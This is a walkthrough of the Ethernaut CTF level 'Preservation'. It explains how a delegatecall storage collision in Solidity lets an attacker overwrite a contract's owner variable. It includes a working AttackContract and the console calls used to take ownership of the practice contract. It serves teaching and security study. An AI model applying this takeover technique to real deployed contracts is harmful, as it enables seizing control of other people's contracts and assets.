# Ethernaut Level 17 (Preservation) Walkthrough

The following is a semantic solution walkthrough of the Ethernaut CTF level 17. The aim is to give a readable explanation of the concepts involved, and present a step-by-step walkthrough of the solution. In addition, tangential explanations will also be given where essential.

This was a very interesting one. The lesson here was that when making delegate call changing state variables, make sure the delegatee contract mirrors the delegator contract's variables. This is because the change will be made at the storage slot where the variable being changed is located in the delegatee/ library contract. Further, to always use `library` keyword to describe library contracts so they are not able to use storage.
An interesting insight was that variable names are only identifiers for the storage slot. The compiler resolves the identifiers to storage slot numbers and understands the type of data stored there by the type assigned. In addition, smaller types can be casted to larger types (just pad more zeroes to the left) but larger types cannot be cast to smaller types without losing data.

Given:

```
ContractA {
    uint var1;
    uint var2;
    address var3;
    
    functionA() {
    delegatecall to B, to change var3 to 15
    }
}

ContractB {
    address var3;
    
    functionB(uint newVar3) {
    change var3 to received value
    }
}
```

When we call A.functionA to change var3 value of A using B's functionB, B will make change to the storage slot 0 where var3 is located. Since this is a delegate call, the context will be of contract A. Thus, in Contract A whatever variable has been assigned storage slot 0 will get overwritten with the value.

#### Solution

The solution was to first figure out the storage collision and overwrite between the library contract and the main contract. After this, I first called the time setting function with the address (type casted to uint; 20 bytes can be casted to 32 bytes without losing data) of this contract, which I would use to Ã¸verwrite the owner variable.

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.6.0 <0.9.0;

// Simple library contract to set the time
contract AttackContract {

  // stores a timestamp 
  uint var1;  
  uint var2;  
  uint storedTime;  
  // First call setTime with this contract's address
  // Call setTime with address typecasted to uint
  // smaller type (address) can be converted to bigger type (uint), 0s will be padded to the left
// The library changes its variable which is at slot 0. By adding two other variables before it, now lib will change what
// ever is at slot 2. When the delegate call happens, lib makes changes to slot slot 2 of the calling contract.
// And at slot 2 is the owner variable.
  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

Made the call:

`await contract.setFirstTime(uint256(AttackContractAddress))`

With the `timeZone1Library` variable in the main contract now holding the address of this contract, I again called `setFirstTime` with my address. this is because this time, the `setTime` function of the `AttackContract` will be called, which will store the address in its`storedTime` variable, which is located at the 2nd storage slot. Since the main contract's context is preserved with the call being a delegate call, the 3rd variable (owner) in the main contract gets overwritten with this value (my address typecasted to uint)
